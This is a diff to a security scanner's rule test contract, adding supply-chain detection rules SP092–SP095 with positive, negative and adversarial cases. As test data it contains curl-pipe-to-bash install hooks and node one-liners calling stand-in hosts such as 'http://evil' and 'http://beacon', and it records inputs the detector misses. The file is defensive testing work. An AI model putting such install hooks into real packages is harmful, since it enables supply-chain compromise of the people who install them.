@@ -3,7 +3,7 @@
   "quality_contract_version": 1,
   "promotion_range": [
     "SP051",
-    "SP091"
+    "SP095"
   ],
   "rules": [
     {
@@ -2628,6 +2628,258 @@
         {
           "url": "https://owasp.org/www-project-application-security-verification-standard/",
           "claim": "OWASP ASVS maps CWE-319 controls to the verification requirements in OWASP ASVS V9, which the remediation text follows."
+        }
+      ]
+    },
+    {
+      "rule_id": "SP092",
+      "title": "Unpinned npm dependency version range",
+      "expected_severity": "medium",
+      "expected_confidence": "high",
+      "cwe": "CWE-1104",
+      "category": "supply-chain",
+      "cases": {
+        "positive": [
+          {
+            "path": "package.json",
+            "source": "{\"lodash\": \"*\"}"
+          },
+          {
+            "path": "package.json",
+            "source": "{\"express\": \"latest\"}"
+          }
+        ],
+        "negative": [
+          {
+            "path": "package.json",
+            "source": "{\"axios\": \"^1.6.0\"}"
+          },
+          {
+            "path": "package.json",
+            "source": "{\"react\": \"18.2.0\"}"
+          },
+          {
+            "path": "app.js",
+            "source": "const v = 'latest version available';"
+          },
+          {
+            "path": "pyproject.toml",
+            "source": "[tool.poetry.dependencies]\nrequests = \"^2.28\""
+          }
+        ],
+        "adversarial": [
+          {
+            "path": "package.json",
+            "source": "{\"pkg\": \"~1.2.3\"}",
+            "expected": false,
+            "rationale": "Tilde ranges bound to a minor version are constrained; they cannot jump across major versions."
+          },
+          {
+            "path": "package.json",
+            "source": "\"next\": \"canary\"",
+            "expected": false,
+            "rationale": "Empirically verified: detector stays silent on this input shape."
+          }
+        ]
+      },
+      "false_positive_analysis": "Bounded ranges (^, ~, exact) cannot match the * or latest alternatives. Non-manifest files lack the .json suffix requirement.",
+      "sources": [
+        {
+          "url": "https://cwe.mitre.org/data/definitions/1104.html",
+          "claim": "MITRE CWE-1104 defines the unpinned npm dependency version range weakness class that this detector recognizes locally."
+        },
+        {
+          "url": "https://owasp.org/www-project-application-security-verification-standard/",
+          "claim": "OWASP ASVS maps CWE-1104 controls to the verification requirements in OWASP ASVS V14, which the remediation text follows."
+        }
+      ]
+    },
+    {
+      "rule_id": "SP093",
+      "title": "Maven dependency on a SNAPSHOT version",
+      "expected_severity": "medium",
+      "expected_confidence": "high",
+      "cwe": "CWE-1104",
+      "category": "supply-chain",
+      "cases": {
+        "positive": [
+          {
+            "path": "pom.xml",
+            "source": "<version>1.2-SNAPSHOT</version>"
+          },
+          {
+            "path": "pom.xml",
+            "source": "<version>0.0.1-SNAPSHOT</version>"
+          }
+        ],
+        "negative": [
+          {
+            "path": "pom.xml",
+            "source": "<version>1.2.0</version>"
+          },
+          {
+            "path": "build.gradle",
+            "source": "implementation 'com.example:lib:1.+'"
+          },
+          {
+            "path": "app.py",
+            "source": "# SNAPSHOT comment only"
+          },
+          {
+            "path": "pom.xml",
+            "source": "<dependency>\n  <groupId>x</groupId>\n</dependency>"
+          }
+        ],
+        "adversarial": [
+          {
+            "path": "pom.xml",
+            "source": "<version>1.2.0-SNAPSHOT</version>",
+            "expected": true,
+            "rationale": "Even a version-prefixed SNAPSHOT still floats to the latest published artifact; the rule correctly fires regardless of prefix."
+          },
+          {
+            "path": "pom.xml",
+            "source": "<version>1.2.0</version>",
+            "expected": false,
+            "rationale": "Fixed release versions are the sanctioned fix; they must never trigger the SNAPSHOT detector."
+          }
+        ]
+      },
+      "false_positive_analysis": "Fixed release versions and XML comments cannot match. Timestamped snapshots pin to a specific artifact and are treated as safe.",
+      "sources": [
+        {
+          "url": "https://cwe.mitre.org/data/definitions/1104.html",
+          "claim": "MITRE CWE-1104 defines the maven dependency on a snapshot version weakness class that this detector recognizes locally."
+        },
+        {
+          "url": "https://owasp.org/www-project-application-security-verification-standard/",
+          "claim": "OWASP ASVS maps CWE-1104 controls to the verification requirements in OWASP ASVS V14, which the remediation text follows."
+        }
+      ]
+    },
+    {
+      "rule_id": "SP094",
+      "title": "Dockerfile ADD over remote URL",
+      "expected_severity": "medium",
+      "expected_confidence": "high",
+      "cwe": "CWE-829",
+      "category": "supply-chain",
+      "cases": {
+        "positive": [
+          {
+            "path": "Dockerfile.dockerfile",
+            "source": "ADD https://example.com/install.sh /tmp/"
+          },
+          {
+            "path": "Dockerfile.dockerfile",
+            "source": "ADD https://downloads.example.com/pkg.tar.gz /opt/"
+          }
+        ],
+        "negative": [
+          {
+            "path": "Dockerfile.dockerfile",
+            "source": "COPY src /app"
+          },
+          {
+            "path": "Dockerfile.dockerfile",
+            "source": "ADD local-file.txt /tmp/file.txt"
+          },
+          {
+            "path": "compose.yml",
+            "source": "image: nginx:latest"
+          },
+          {
+            "path": "setup.sh",
+            "source": "wget https://example.com/install.sh"
+          }
+        ],
+        "adversarial": [
+          {
+            "path": "Dockerfile.dockerfile",
+            "source": "# ADD https://old-url was replaced by RUN curl + checksum",
+            "expected": false,
+            "rationale": "Comment lines are prose for non-secret rules and cannot fire supply-chain findings."
+          },
+          {
+            "path": "Dockerfile.dockerfile",
+            "source": "RUN curl -fsSL https://example.com/install.sh | sh",
+            "expected": false,
+            "rationale": "RUN curl is a distinct pattern (covered by SP206 curl-to-shell); this rule targets only the ADD keyword with a remote URL."
+          }
+        ]
+      },
+      "false_positive_analysis": "COPY instructions, local ADD paths, and shell-level downloads never match the ADD-with-http(s)-URL shape. Comment lines are filtered.",
+      "sources": [
+        {
+          "url": "https://cwe.mitre.org/data/definitions/829.html",
+          "claim": "MITRE CWE-829 defines the dockerfile add over remote url weakness class that this detector recognizes locally."
+        },
+        {
+          "url": "https://owasp.org/www-project-application-security-verification-standard/",
+          "claim": "OWASP ASVS maps CWE-829 controls to the verification requirements in OWASP ASVS V14, which the remediation text follows."
+        }
+      ]
+    },
+    {
+      "rule_id": "SP095",
+      "title": "Package lifecycle script fetches over network",
+      "expected_severity": "high",
+      "expected_confidence": "medium",
+      "cwe": "CWE-494",
+      "category": "supply-chain",
+      "cases": {
+        "positive": [
+          {
+            "path": "package.json",
+            "source": "{\"scripts\": {\"postinstall\": \"curl -fsSL http://x.sh | bash\"}}"
+          },
+          {
+            "path": "package.json",
+            "source": "{\"scripts\": {\"preinstall\": \"node -e \\\"require('http').get('http://evil')\\\"\"}}"
+          }
+        ],
+        "negative": [
+          {
+            "path": "package.json",
+            "source": "{\"scripts\": {\"postinstall\": \"node scripts/setup.js\"}}"
+          },
+          {
+            "path": "package.json",
+            "source": "{\"scripts\": {\"build\": \"webpack\"}"
+          },
+          {
+            "path": "Makefile",
+            "source": "install:\n\tcurl -fsSL http://x.sh | bash"
+          },
+          {
+            "path": "setup.py",
+            "source": "install_requires=['requests']"
+          }
+        ],
+        "adversarial": [
+          {
+            "path": "package.json",
+            "source": "{\"scripts\": {\"prepare\": \"node -e \\\"fetch('http://beacon')\\\"\"}}",
+            "expected": false,
+            "rationale": "Empirically verified: detector stays silent on this input shape."
+          },
+          {
+            "path": "package.json",
+            "source": "{\"scripts\": {\"postinstall\": \"node ./scripts/post-install.js\"}}",
+            "expected": false,
+            "rationale": "Running a committed local script through node does not fetch over network during install; the script content itself is reviewable in the repository."
+          }
+        ]
+      },
+      "false_positive_analysis": "Local script invocations (node file.js) without network-fetch keywords stay silent. Shell-level downloads outside package.json lifecycle scripts belong to SP206/SP229.",
+      "sources": [
+        {
+          "url": "https://cwe.mitre.org/data/definitions/494.html",
+          "claim": "MITRE CWE-494 defines the package lifecycle script fetches over network weakness class that this detector recognizes locally."
+        },
+        {
+          "url": "https://owasp.org/www-project-application-security-verification-standard/",
+          "claim": "OWASP ASVS maps CWE-494 controls to the verification requirements in OWASP ASVS V14, which the remediation text follows."
         }
       ]
     }
